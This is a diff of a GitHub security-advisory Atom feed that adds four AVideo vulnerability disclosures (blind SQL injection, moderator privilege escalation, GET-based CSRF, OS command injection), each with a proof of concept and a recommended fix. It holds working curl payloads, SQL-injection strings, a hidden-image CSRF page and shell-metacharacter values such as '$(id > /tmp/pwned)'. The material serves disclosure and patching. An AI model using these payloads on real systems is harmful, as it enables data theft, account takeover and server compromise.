@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-03-25T17:19:21.715Z</updated>
+    <updated>2026-03-25T18:15:23.349Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,627 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo has a Blind SQL Injection in Live Schedule Reminder via Unsanitized live_schedule_id in Scheduler_commands::getAllActiveOrToRepeat()]]></title>
+        <id>https://github.com/advisories/GHSA-pvw4-p2jm-chjm</id>
+        <link href="https://github.com/advisories/GHSA-pvw4-p2jm-chjm"/>
+        <updated>2026-03-25T17:50:16.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>remindMe.json.php</code> endpoint passes <code>$_REQUEST['live_schedule_id']</code> through multiple functions without sanitization until it reaches <code>Scheduler_commands::getAllActiveOrToRepeat()</code>, which directly concatenates it into a SQL <code>LIKE</code> clause. Although intermediate functions (<code>new Live_schedule()</code>, <code>getUsers_idOrCompany()</code>) apply <code>intval()</code> internally, they do so on local copies within <code>ObjectYPT::getFromDb()</code>, leaving the original tainted variable unchanged. Any authenticated user can perform time-based blind SQL injection to extract arbitrary database contents.</p>
+<h2 id="details">Details</h2>
+<p>The vulnerability involves a 6-step data flow from user input to an unsanitized SQL sink:</p>
+<p><strong>Step 1 — User input (no sanitization):</strong>
+<code>plugin/Live/remindMe.json.php:15</code>:</p>
+<pre><code class="language-php">$reminder = Live::setLiveScheduleReminder($_REQUEST['live_schedule_id'], ...);
+</code></pre>
+<p><strong>Step 2 — Auth check passes for any user:</strong>
+<code>plugin/Live/Live.php:4126</code>:</p>
+<pre><code class="language-php">if (!User::isLogged()) {
+    $obj-&gt;msg = __('Must be logged');
+    return $obj;
+}
+</code></pre>
+<p><strong>Step 3 — intval() applied only internally, original variable unchanged:</strong>
+<code>plugin/Live/Live.php:4141-4143</code>:</p>
+<pre><code class="language-php">$ls = new Live_schedule($live_schedule_id);  // intval() inside getFromDb() only
+$users_id = Live_schedule::getUsers_idOrCompany($live_schedule_id);  // same
+</code></pre>
+<p><code>objects/Object.php:84</code> (inside <code>getFromDb()</code>):</p>
+<pre><code class="language-php">$id = intval($id);  // sanitizes the LOCAL parameter, not the caller's variable
+</code></pre>
+<p>With input like <code>1" AND SLEEP(5) --</code>, <code>intval()</code> extracts <code>1</code>, loads schedule ID 1 successfully. The caller's <code>$live_schedule_id</code> remains <code>1" AND SLEEP(5) --</code>.</p>
+<p><strong>Step 4 — Tainted value flows to type string construction:</strong>
+<code>plugin/Live/Live.php:4152</code> → <code>Live.php:4193-4194</code>:</p>
+<pre><code class="language-php">$reminders = self::getLiveScheduleReminders($live_schedule_id);
+
+// getLiveScheduleReminders calls:
+$type = self::getLiveScheduleReminderBaseNameType($live_schedule_id);
+// which builds: "LiveScheduleReminder_{$to_users_id}_{$live_schedule_id}"
+return Scheduler_commands::getAllActiveOrToRepeat($type);
+</code></pre>
+<p><strong>Step 5 — SQL injection sink:</strong>
+<code>plugin/Scheduler/Objects/Scheduler_commands.php:340-347</code>:</p>
+<pre><code class="language-php">$sql = "SELECT * FROM " . static::getTableName() . " WHERE (status='a' OR status='r') ";
+if(!empty($type)){
+    $sql .= ' AND `type` LIKE "'.$type.'%" ';  // LINE 343: direct concatenation
+}
+$res = sqlDAL::readSql($sql);  // LINE 347: no parameterization
+</code></pre>
+<h2 id="poc">PoC</h2>
+<p><strong>Prerequisites:</strong> Any authenticated user session, at least one <code>live_schedule</code> record (ID=1).</p>
+<p><strong>Step 1 — Baseline request (should return quickly):</strong></p>
+<pre><code class="language-bash">curl -s -o /dev/null -w "%{time_total}" \
+  -b "PHPSESSID=&lt;valid_session&gt;" \
+  "http://target/plugin/Live/remindMe.json.php?live_schedule_id=1&amp;minutesEarlier=10"
+</code></pre>
+<p>Expected: response in ~0.1-0.5s</p>
+<p><strong>Step 2 — Time-based injection (5 second delay):</strong></p>
+<pre><code class="language-bash">curl -s -o /dev/null -w "%{time_total}" \
+  -b "PHPSESSID=&lt;valid_session&gt;" \
+  --get --data-urlencode 'live_schedule_id=1" AND SLEEP(5) -- ' \
+  --data-urlencode 'minutesEarlier=10' \
+  "http://target/plugin/Live/remindMe.json.php"
+</code></pre>
+<p>Expected: response delayed by ~5 seconds, confirming injection.</p>
+<p>The resulting SQL becomes:</p>
+<pre><code class="language-sql">SELECT * FROM scheduler_commands
+WHERE (status='a' OR status='r')
+  AND `type` LIKE "LiveScheduleReminder_123_1" AND SLEEP(5) -- %"
+</code></pre>
+<p><strong>Step 3 — Data extraction (example: first character of database user):</strong></p>
+<pre><code class="language-bash">curl -s -o /dev/null -w "%{time_total}" \
+  -b "PHPSESSID=&lt;valid_session&gt;" \
+  --get --data-urlencode 'live_schedule_id=1" AND IF(SUBSTRING(user(),1,1)="r",SLEEP(5),0) -- ' \
+  --data-urlencode 'minutesEarlier=10' \
+  "http://target/plugin/Live/remindMe.json.php"
+</code></pre>
+<p>If the response is delayed 5 seconds, the first character of <code>user()</code> is <code>r</code>.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Full database read</strong>: An attacker with any authenticated session can extract all database contents character-by-character using time-based blind techniques, including admin credentials, user PII (emails, passwords), API keys, and session tokens.</li>
+<li><strong>Data modification</strong>: Depending on MySQL permissions, stacked queries or subquery-based writes could allow INSERT/UPDATE/DELETE operations.</li>
+<li><strong>Account takeover</strong>: Extracted admin password hashes or session tokens enable full platform compromise.</li>
+<li><strong>Low barrier</strong>: Only requires a basic authenticated account — no admin privileges needed.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p><strong>Option 1 — Parameterize the query in <code>Scheduler_commands::getAllActiveOrToRepeat()</code>:</strong></p>
+<p><code>plugin/Scheduler/Objects/Scheduler_commands.php:335-347</code>:</p>
+<pre><code class="language-php">public static function getAllActiveOrToRepeat($type='') {
+    global $global;
+    if (!static::isTableInstalled()) {
+        return false;
+    }
+    $sql = "SELECT * FROM " . static::getTableName() . " WHERE (status=? OR status=?) ";
+    $formats = "ss";
+    $values = [self::$statusActive, self::$statusRepeat];
+
+    if(!empty($type)){
+        $sql .= ' AND `type` LIKE ? ';
+        $formats .= "s";
+        $values[] = $type . "%";
+    }
+
+    $sql .= self::getSqlFromPost();
+    $res = sqlDAL::readSql($sql, $formats, $values);
+    $fullData = sqlDAL::fetchAllAssoc($res);
+    sqlDAL::close($res);
+    $rows = array();
+    if ($res != false) {
+        foreach ($fullData as $row) {
+            $rows[] = $row;
+        }
+    }
+    return $rows;
+}
+</code></pre>
+<p><strong>Option 2 — Additionally sanitize at the entry point:</strong></p>
+<p><code>plugin/Live/remindMe.json.php:15</code> (defense in depth):</p>
+<pre><code class="language-php">$_REQUEST['live_schedule_id'] = intval($_REQUEST['live_schedule_id']);
+$reminder = Live::setLiveScheduleReminder($_REQUEST['live_schedule_id'], ...);
+</code></pre>
+<p>Both fixes should be applied for defense in depth.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-pvw4-p2jm-chjm">https://github.com/WWBN/AVideo/security/advisories/GHSA-pvw4-p2jm-chjm</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33651">https://nvd.nist.gov/vuln/detail/CVE-2026-33651</a></li>
+<li><a href="https://github.com/WWBN/AVideo/commit/75d45780728294ededa1e3f842f95295d3e7d144">https://github.com/WWBN/AVideo/commit/75d45780728294ededa1e3f842f95295d3e7d144</a></li>
+<li><a href="https://github.com/advisories/GHSA-pvw4-p2jm-chjm">https://github.com/advisories/GHSA-pvw4-p2jm-chjm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-pvw4-p2jm-chjm</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-25T17:50:16.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo: Video Moderator Privilege Escalation via Ownership Transfer Enables Arbitrary Video Deletion]]></title>
+        <id>https://github.com/advisories/GHSA-8x77-f38v-4m5j</id>
+        <link href="https://github.com/advisories/GHSA-8x77-f38v-4m5j"/>
+        <updated>2026-03-25T17:49:33.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A user with the "Videos Moderator" permission can escalate privileges to perform full video management operations — including ownership transfer and deletion of any video — despite the permission being documented as only allowing video publicity changes (Active, Inactive, Unlisted). The root cause is that <code>Permissions::canModerateVideos()</code> is used as an authorization gate for full video editing in <code>videoAddNew.json.php</code>, while <code>videoDelete.json.php</code> only checks ownership, creating an asymmetric authorization boundary exploitable via a two-step ownership-transfer-then-delete chain.</p>
+<h2 id="details">Details</h2>
+<p>The <code>PERMISSION_INACTIVATEVIDEOS</code> (ID 11) permission is described as a limited moderator role in <code>plugin/Permissions/Permissions.php:213</code>:</p>
+<pre><code class="language-php">$permissions[] = new PluginPermissionOption(
+    Permissions::PERMISSION_INACTIVATEVIDEOS, 
+    __('Videos Moderator'), 
+    __('This is a level below the (Videos Admin), this type of user can change the video publicity (Active, Inactive, Unlisted)'), 
+    'Permissions'
+);
+</code></pre>
+<p>However, <code>Permissions::canModerateVideos()</code> (<code>Permissions.php:175</code>) is reused as an authorization gate in multiple locations in <code>videoAddNew.json.php</code> that go far beyond status changes:</p>
+<p><strong>1. Upload gate bypass</strong> (<code>videoAddNew.json.php:10</code>):
+<code>User::canUpload()</code> (<code>user.php:2650</code>) returns <code>true</code> if <code>Permissions::canModerateVideos()</code> is true, granting moderators upload access.</p>
+<p><strong>2. Edit gate bypass</strong> (<code>videoAddNew.json.php:19</code>):</p>
+<pre><code class="language-php">if (!Video::canEdit($_POST['id']) &amp;&amp; !Permissions::canModerateVideos()) {
+    die('{"error":"2 ' . __("Permission denied") . '"}');
+}
+</code></pre>
+<p><code>Video::canEdit()</code> correctly checks only <code>canAdminVideos()</code> and ownership, but the <code>|| !Permissions::canModerateVideos()</code> fallback allows moderators to edit any video.</p>
+<p><strong>3. Ownership transfer</strong> (<code>videoAddNew.json.php:222</code>):</p>
+<pre><code class="language-php">if ($advancedCustomUser-&gt;userCanChangeVideoOwner || Permissions::canModerateVideos() || 
+    Users_affiliations::isUserAffiliateOrCompanyToEachOther($obj-&gt;getUsers_id(), $_POST['users_id'])) {
+    $obj-&gt;setUsers_id($_POST['users_id']);
+}
+</code></pre>
+<p><code>userCanChangeVideoOwner</code> defaults to <code>false</code> (<code>CustomizeUser.php:286</code>), but <code>canModerateVideos()</code> provides an unconditional bypass, allowing any moderator to reassign ownership of any video.</p>
+<p><strong>4. Delete via ownership</strong> (<code>videoDelete.json.php:22-28</code>):</p>
+<pre><code class="language-php">if(empty($video-&gt;getUsers_id()) || $video-&gt;getUsers_id() != User::getId()){
+    if (!$video-&gt;userCanManageVideo()) {
+        // denied
+    }
+}
+$id = $video-&gt;delete();
+</code></pre>
+<p><code>userCanManageVideo()</code> (<code>video.php:3614</code>) checks <code>canAdminVideos()</code> (not <code>canModerateVideos()</code>), then falls back to ownership. After the ownership transfer in step 3, the moderator is now the owner, so this check passes.</p>
+<p>The authorization asymmetry: <code>videoAddNew.json.php</code> treats <code>canModerateVideos()</code> as equivalent to <code>canAdminVideos()</code>, but <code>videoDelete.json.php</code> and <code>userCanManageVideo()</code> do not — creating a gap exploitable by transferring ownership first.</p>
+<p>Additional fields a moderator can modify beyond their intended scope:</p>
+<ul>
+<li><code>only_for_paid</code> (line 210) — make premium content free</li>
+<li><code>video_password</code> (line 211) — change/remove password protection</li>
+<li><code>categories_id</code> (line 168) — alter content categorization</li>
+<li><code>videoGroups</code> (line 175) — modify user group visibility</li>
+</ul>
+<h2 id="poc">PoC</h2>
+<p><strong>Prerequisites:</strong> An account with the "Videos Moderator" permission (PERMISSION_INACTIVATEVIDEOS = 11) and a target video ID owned by another user.</p>
+<p><strong>Step 1: Transfer ownership of target video to attacker</strong></p>
+<pre><code class="language-bash"># ATTACKER_USER_ID = moderator's user ID
+# TARGET_VIDEO_ID = ID of video owned by another user (e.g., admin)
+curl -s -b cookies.txt -X POST \
+  'http://localhost/objects/videoAddNew.json.php' \
+  -d "id=TARGET_VIDEO_ID&amp;users_id=ATTACKER_USER_ID&amp;title=unchanged"
+</code></pre>
+<p>Expected response: <code>{"status":true, ...}</code> — ownership is now transferred to the attacker.</p>
+<p><strong>Step 2: Delete the video (now owned by attacker)</strong></p>
+<pre><code class="language-bash">curl -s -b cookies.txt -X POST \
+  'http://localhost/objects/videoDelete.json.php' \
+  -d "id[]=TARGET_VIDEO_ID"
+</code></pre>
+<p>Expected response: <code>{"error":false, ...}</code> — video is deleted. The owner check at line 22 passes because the moderator is now the recorded owner.</p>
+<p><strong>Step 3 (additional impact): Access password-protected video</strong></p>
+<pre><code class="language-bash">curl -s -b cookies.txt -X POST \
+  'http://localhost/objects/videoAddNew.json.php' \
+  -d "id=TARGET_VIDEO_ID&amp;video_password=&amp;title=unchanged"
+</code></pre>
+<p>This removes the video password, granting the moderator (and everyone) access to previously protected content.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Arbitrary video deletion</strong>: A Videos Moderator can delete any video on the platform, including admin-owned content, by first transferring ownership to themselves then deleting.</li>
+<li><strong>Content tampering</strong>: Moderator can change paid content flags (<code>only_for_paid</code>), video passwords, categories, and user group visibility on any video — all exceeding the documented scope of "change video publicity."</li>
+<li><strong>Access control bypass</strong>: Password-protected videos can have their passwords removed, exposing restricted content.</li>
+<li><strong>Integrity loss</strong>: Video ownership records are corrupted, making audit trails unreliable.</li>
+<li><strong>Availability impact</strong>: Targeted deletion of high-value content with no authorization check appropriate to the destructive action.</li>
+</ul>
+<p>The blast radius is any video on the platform. Any user granted the "Videos Moderator" role — which administrators may grant freely assuming it only allows status changes — gains effective full video management capabilities.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Replace <code>Permissions::canModerateVideos()</code> with <code>Permissions::canAdminVideos()</code> in <code>videoAddNew.json.php</code> where full edit capabilities are granted. Keep <code>canModerateVideos()</code> only for the specific status/publicity change operations it was designed for.</p>
+<p><strong>Fix for ownership transfer</strong> (<code>videoAddNew.json.php:222</code>):</p>
+<pre><code class="language-php">// Before (vulnerable):
+if ($advancedCustomUser-&gt;userCanChangeVideoOwner || Permissions::canModerateVideos() || ...
+
+// After (fixed):
+if ($advancedCustomUser-&gt;userCanChangeVideoOwner || Permissions::canAdminVideos() || ...
+</code></pre>
+<p><strong>Fix for edit gate</strong> (<code>videoAddNew.json.php:19</code>):</p>
+<pre><code class="language-php">// Before (vulnerable):
+if (!Video::canEdit($_POST['id']) &amp;&amp; !Permissions::canModerateVideos()) {
+
+// After (fixed): 
+if (!Video::canEdit($_POST['id']) &amp;&amp; !Permissions::canAdminVideos()) {
+</code></pre>
+<p>Then create a separate, narrower code path for moderators that only allows changing video status/publicity fields. Alternatively, refactor <code>videoAddNew.json.php</code> to check <code>canModerateVideos()</code> only around the specific status-change logic (lines 238-248) and require <code>canAdminVideos()</code> for all other fields.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-8x77-f38v-4m5j">https://github.com/WWBN/AVideo/security/advisories/GHSA-8x77-f38v-4m5j</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33650">https://nvd.nist.gov/vuln/detail/CVE-2026-33650</a></li>
+<li><a href="https://github.com/WWBN/AVideo/commit/838e16818c793779406ecbf34ebaeba9830e33f8">https://github.com/WWBN/AVideo/commit/838e16818c793779406ecbf34ebaeba9830e33f8</a></li>
+<li><a href="https://github.com/advisories/GHSA-8x77-f38v-4m5j">https://github.com/advisories/GHSA-8x77-f38v-4m5j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8x77-f38v-4m5j</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-25T17:49:32.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo's GET-Based CSRF in setPermission.json.php Enables Privilege Escalation via Arbitrary Permission Modification]]></title>
+        <id>https://github.com/advisories/GHSA-g8x9-7mgh-7cvj</id>
+        <link href="https://github.com/advisories/GHSA-g8x9-7mgh-7cvj"/>
+        <updated>2026-03-25T17:48:18.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>plugin/Permissions/setPermission.json.php</code> endpoint accepts GET parameters for a state-changing operation that modifies user group permissions. The endpoint has no CSRF token validation, and the application explicitly sets <code>session.cookie_samesite=None</code> on session cookies. This allows an unauthenticated attacker to craft a page with <code>&lt;img&gt;</code> tags that, when visited by an admin, silently grant arbitrary permissions to the attacker's user group — escalating the attacker to near-admin access.</p>
+<h2 id="details">Details</h2>
+<p>The root cause is a combination of three issues:</p>
+<p><strong>1. <code>$_REQUEST</code> used instead of <code>$_POST</code> (accepts GET parameters):</strong></p>
+<p><code>plugin/Permissions/setPermission.json.php:14-24</code>:</p>
+<pre><code class="language-php">$intvalList = array('users_groups_id','plugins_id','type','isEnabled');
+foreach ($intvalList as $value) {
+    if($_REQUEST[$value]==='true'){
+        $_REQUEST[$value] = 1;
+    }else{
+        $_REQUEST[$value] = intval($_REQUEST[$value]);
+    }
+}
+
+$obj = new stdClass();
+$obj-&gt;id = Permissions::setPermission($_REQUEST['users_groups_id'], $_REQUEST['plugins_id'], $_REQUEST['type'], $_REQUEST['isEnabled']);
+</code></pre>
+<p>The only authorization check is <code>User::isAdmin()</code> at line 10 — there is no CSRF token validation via <code>isGlobalTokenValid()</code>.</p>
+<p><strong>2. Session cookies set to <code>SameSite=None</code>:</strong></p>
+<p><code>objects/include_config.php:134-141</code>:</p>
+<pre><code class="language-php">if ($isHTTPS) {
+    // SameSite=None is intentional: AVideo supports cross-origin iframe embedding
+    ini_set('session.cookie_samesite', 'None');
+    ini_set('session.cookie_secure', '1');
+}
+</code></pre>
+<p>This means the admin's session cookie is sent on cross-origin requests, including those initiated by <code>&lt;img src="..."&gt;</code> tags on attacker-controlled pages.</p>
+<p><strong>3. The codebase's own security model requires CSRF tokens on state-mutating endpoints:</strong></p>
+<p>The comment at <code>include_config.php:137-138</code> states: <em>"All state-mutating endpoints that are vulnerable to CSRF must instead enforce a short-lived globalToken (verifyToken)."</em> Other endpoints like <code>saveSort.json.php</code> and <code>pluginImport.json.php</code> enforce <code>isGlobalTokenValid()</code>, but <code>setPermission.json.php</code> does not.</p>
+<p><strong>Execution flow:</strong></p>
+<ol>
+<li>Attacker hosts a page containing <code>&lt;img src="https://target/plugin/Permissions/setPermission.json.php?users_groups_id=2&amp;plugins_id=1&amp;type=10&amp;isEnabled=true"&gt;</code></li>
+<li>Admin visits the page (e.g., via link in forum, email, or embedded content)</li>
+<li>Browser issues GET request with the admin's <code>SameSite=None</code> session cookie</li>
+<li><code>User::isAdmin()</code> passes because the request carries the admin's session</li>
+<li><code>Permissions::setPermission()</code> grants PERMISSION_FULLACCESSVIDEOS (type=10) to user group 2</li>
+<li>Any user in group 2 (including the attacker) now has full video admin access</li>
+</ol>
+<p>The <code>users_groups_id</code> values are small sequential integers (typically 1-3 for default groups) and can be trivially enumerated.</p>
+<h2 id="poc">PoC</h2>
+<p><strong>Step 1: Attacker creates a page granting multiple permissions to their user group (ID 2):</strong></p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Interesting Video&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Check out this video!&lt;/h1&gt;
+&lt;!-- Each img tag silently fires a GET request with admin's session cookie --&gt;
+&lt;!-- PERMISSION_FULLACCESSVIDEOS (type=10) --&gt;
+&lt;img src='https://target.example.com/plugin/Permissions/setPermission.json.php?users_groups_id=2&amp;plugins_id=1&amp;type=10&amp;isEnabled=true' style='display:none'&gt;
+&lt;!-- PERMISSION_USERS (type=20) --&gt;
+&lt;img src='https://target.example.com/plugin/Permissions/setPermission.json.php?users_groups_id=2&amp;plugins_id=1&amp;type=20&amp;isEnabled=true' style='display:none'&gt;
+&lt;!-- PERMISSION_CAN_UPLOAD_VIDEOS (type=70) --&gt;
+&lt;img src='https://target.example.com/plugin/Permissions/setPermission.json.php?users_groups_id=2&amp;plugins_id=1&amp;type=70&amp;isEnabled=true' style='display:none'&gt;
+&lt;!-- PERMISSION_CAN_LIVESTREAM (type=80) --&gt;
+&lt;img src='https://target.example.com/plugin/Permissions/setPermission.json.php?users_groups_id=2&amp;plugins_id=1&amp;type=80&amp;isEnabled=true' style='display:none'&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p><strong>Step 2: Attacker sends the link to an admin (social engineering, forum post, etc.)</strong></p>
+<p><strong>Step 3: When the admin loads the page, all four <code>&lt;img&gt;</code> tags fire simultaneously.</strong></p>
+<p>Expected response for each request (visible in browser dev tools):</p>
+<pre><code class="language-json">{"id":"1"}
+</code></pre>
+<p><strong>Step 4: Verify — the attacker (a regular user in group 2) now has full video management, user management, upload, and livestream permissions without being an admin.</strong></p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Privilege escalation:</strong> A low-privileged user can gain near-admin permissions (full video access, user management, upload, livestream) by tricking an admin into loading a single page.</li>
+<li><strong>No JavaScript required:</strong> The attack uses only <code>&lt;img&gt;</code> tags, bypassing Content Security Policy restrictions and working even in contexts where scripts are blocked (email clients, forum BBCode, etc.).</li>
+<li><strong>Zero interaction beyond page load:</strong> Unlike POST-based CSRF that requires form submission or JavaScript, this fires automatically when the page renders.</li>
+<li><strong>Chaining:</strong> Multiple permissions can be granted simultaneously by embedding multiple <code>&lt;img&gt;</code> tags. An attacker can grant their group all available permission types in a single page load.</li>
+<li><strong>Blast radius:</strong> All users in the targeted group receive the escalated permissions, not just the attacker.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>In <code>plugin/Permissions/setPermission.json.php</code>, change <code>$_REQUEST</code> to <code>$_POST</code> and add CSRF token validation:</p>
+<pre><code class="language-php">&lt;?php
+
+header('Content-Type: application/json');
+if (!isset($global['systemRootPath'])) {
+    $configFile = '../../videos/configuration.php';
+    if (file_exists($configFile)) {
+        require_once $configFile;
+    }
+}
+if(!User::isAdmin()){
+    forbiddenPage("Not admin");
+}
+
+// Enforce POST method and CSRF token
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    die(json_encode(array('error' =&gt; 'POST method required')));
+}
+if (!isGlobalTokenValid()) {
+    die(json_encode(array('error' =&gt; 'Invalid CSRF token')));
+}
+
+$intvalList = array('users_groups_id','plugins_id','type','isEnabled');
+foreach ($intvalList as $value) {
+    if($_POST[$value]==='true'){
+        $_POST[$value] = 1;
+    }else{
+        $_POST[$value] = intval($_POST[$value]);
+    }
+}
+
+$obj = new stdClass();
+$obj-&gt;id = Permissions::setPermission($_POST['users_groups_id'], $_POST['plugins_id'], $_POST['type'], $_POST['isEnabled']);
+
+die(json_encode($obj));
+</code></pre>
+<p>The AJAX call in <code>getPermissionsFromPlugin.html.php:84-92</code> already uses <code>type: 'post'</code> but must also send the <code>globalToken</code> parameter in its data payload.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-g8x9-7mgh-7cvj">https://github.com/WWBN/AVideo/security/advisories/GHSA-g8x9-7mgh-7cvj</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33649">https://nvd.nist.gov/vuln/detail/CVE-2026-33649</a></li>
+<li><a href="https://github.com/advisories/GHSA-g8x9-7mgh-7cvj">https://github.com/advisories/GHSA-g8x9-7mgh-7cvj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g8x9-7mgh-7cvj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-25T17:48:17.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo Vulnerable to OS Command Injection via Unsanitized `users_id` and `liveTransmitionHistory_id` in Restreamer Log File Path]]></title>
+        <id>https://github.com/advisories/GHSA-5m4q-5cvx-36mw</id>
+        <link href="https://github.com/advisories/GHSA-5m4q-5cvx-36mw"/>
+        <updated>2026-03-25T17:47:22.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The restreamer endpoint constructs a log file path by embedding user-controlled <code>users_id</code> and <code>liveTransmitionHistory_id</code> values from the JSON request body without any sanitization. This log file path is then concatenated directly into shell commands passed to <code>exec()</code>, allowing an authenticated user to achieve arbitrary command execution on the server via shell metacharacters such as <code>$()</code> or backticks.</p>
+<h2 id="details">Details</h2>
+<p>The vulnerability exists in <code>plugin/Live/standAloneFiles/restreamer.json.php</code>. The data flow is:</p>
+<p><strong>1. User input ingestion</strong> (line 220):</p>
+<pre><code class="language-php">$request = file_get_contents("php://input");
+$robj = json_decode($request);
+</code></pre>
+<p><strong>2. Log file template</strong> (line 58):</p>
+<pre><code class="language-php">$logFile = $logFileLocation . "ffmpeg_restreamer_{users_id}_" . date("Y-m-d-h-i-s") . ".log";
+</code></pre>
+<p><strong>3. <code>users_id</code> injected without sanitization</strong> (line 318):</p>
+<pre><code class="language-php">$obj-&gt;logFile = str_replace('{users_id}', $robj-&gt;users_id, $logFile);
+</code></pre>
+<p><strong>4. <code>liveTransmitionHistory_id</code> injected without sanitization</strong> (line 407):</p>
+<pre><code class="language-php">$pid[] = startRestream($m3u8, [$value], str_replace(".log", "_{$key}_{$robj-&gt;liveTransmitionHistory_id}_{$host}.log", $logFile), $robj);
+</code></pre>
+<p>Note: <code>intval()</code> is applied to <code>liveTransmitionHistory_id</code> in the separate <code>getProcess()</code> function (line 805), but NOT in the <code>runRestream()</code> path that constructs the log file.</p>
+<p><strong>5. Unsanitized log file path passed to <code>exec()</code></strong> (lines 720, 723):</p>
+<pre><code class="language-php">// Line 720 (remote ffmpeg path):
+execFFMPEGAsyncOrRemote($command . ' &gt; ' . $logFile . ' 2&gt;&amp;1 ', $keyword, '', $restreamStandAloneFFMPEG);
+
+// Line 723 (direct execution fallback):
+exec($command . ' &gt; ' . $logFile . ' 2&gt;&amp;1 &amp;');
+</code></pre>
+<p>The code sanitizes stream URLs via <code>clearCommandURL()</code> and uses <code>escapeshellarg()</code> for pgrep patterns elsewhere, but completely neglects the log file path — a classic oversight where one injection vector is hardened while an adjacent one is left open.</p>
+<h2 id="poc">PoC</h2>
+<p><strong>Prerequisites:</strong> A valid AVideo account with live streaming permissions and a valid restream token.</p>
+<p><strong>Step 1:</strong> Obtain a valid live streaming token by starting a live stream through the AVideo interface, or by calling the live API.</p>
+<p><strong>Step 2:</strong> Send a crafted restream request with shell metacharacters in <code>users_id</code>:</p>
+<pre><code class="language-bash">curl -k -X POST "https://TARGET/plugin/Live/standAloneFiles/restreamer.json.php" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "token": "VALID_TOKEN",
+    "m3u8": "https://example.com/stream.m3u8",
+    "restreamsDestinations": ["rtmp://example.com/live/key"],
+    "restreamsToken": ["VALID_TOKEN"],
+    "users_id": "x$(id &gt; /tmp/pwned)x",
+    "liveTransmitionHistory_id": "1"
+  }'
+</code></pre>
+<p><strong>Step 3:</strong> The resulting exec call becomes:</p>
+<pre><code>ffmpeg ... &gt; /var/www/tmp/ffmpeg_restreamer_x$(id &gt; /tmp/pwned)x_2026-03-20-... .log 2&gt;&amp;1 &amp;
+</code></pre>
+<p>The <code>$()</code> subshell executes <code>id &gt; /tmp/pwned</code> before the redirection is processed.</p>
+<p><strong>Step 4:</strong> Verify command execution:</p>
+<pre><code class="language-bash">curl -k "https://TARGET/tmp/pwned"
+# Expected: output of `id` command showing the web server user
+</code></pre>
+<p>The same vector works through <code>liveTransmitionHistory_id</code>:</p>
+<pre><code class="language-bash">curl -k -X POST "https://TARGET/plugin/Live/standAloneFiles/restreamer.json.php" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "token": "VALID_TOKEN",
+    "m3u8": "https://example.com/stream.m3u8",
+    "restreamsDestinations": ["rtmp://example.com/live/key"],
+    "restreamsToken": ["VALID_TOKEN"],
+    "users_id": "1",
+    "liveTransmitionHistory_id": "1$(whoami &gt; /tmp/pwned2)1"
+  }'
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An authenticated user with restream permissions can execute arbitrary OS commands on the server with the privileges of the web server process. This allows:</p>
+<ul>
+<li><strong>Full server compromise</strong>: Reading sensitive files (<code>/etc/passwd</code>, database credentials, <code>.env</code> files)</li>
+<li><strong>Data exfiltration</strong>: Accessing the AVideo database and all user data</li>
+<li><strong>Lateral movement</strong>: Using the compromised server as a pivot point</li>
+<li><strong>Service disruption</strong>: Killing processes, modifying or deleting files</li>
+<li><strong>Persistent backdoor</strong>: Installing web shells or cron jobs for ongoing access</li>
+</ul>
+<p>The authentication requirement (PR:L) limits this to users who have been granted streaming access, but in many AVideo deployments user registration is open, making this effectively a low-barrier attack.</p>
